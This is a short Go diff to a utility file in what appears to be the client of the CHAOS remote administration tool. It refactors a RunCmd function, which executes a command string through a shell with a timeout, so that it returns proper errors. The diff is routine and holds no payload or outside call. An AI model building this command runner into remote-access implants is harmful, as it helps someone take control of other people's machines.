@@ -2,6 +2,7 @@ package util
 
 import (
 	"context"
+	"fmt"
 	"github.com/tiagorlampert/CHAOS/client/app/models"
 	"github.com/tiagorlampert/CHAOS/client/app/util/network"
 	"os"
@@ -26,7 +27,7 @@ func LoadDeviceSpecs() *models.Device {
 	}
 }
 
-func RunCmd(cmd string, timeout time.Duration) []byte {
+func RunCmd(cmd string, timeout time.Duration) ([]byte, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), timeout*time.Second)
 	defer cancel()
 
@@ -41,15 +42,15 @@ func RunCmd(cmd string, timeout time.Duration) []byte {
 	case Darwin:
 		cmdExec = exec.CommandContext(ctx, "sh", "-c", cmd)
 	default:
-		return []byte("os not supported")
+		return nil, fmt.Errorf("os not supported")
 	}
 
 	c, err := cmdExec.CombinedOutput()
 	if err != nil {
 		if ctx.Err() != nil {
-			return []byte("command deadline exceeded")
+			return nil, fmt.Errorf("command deadline exceeded")
 		}
-		return c
+		return nil, err
 	}
-	return c
+	return c, nil
 }
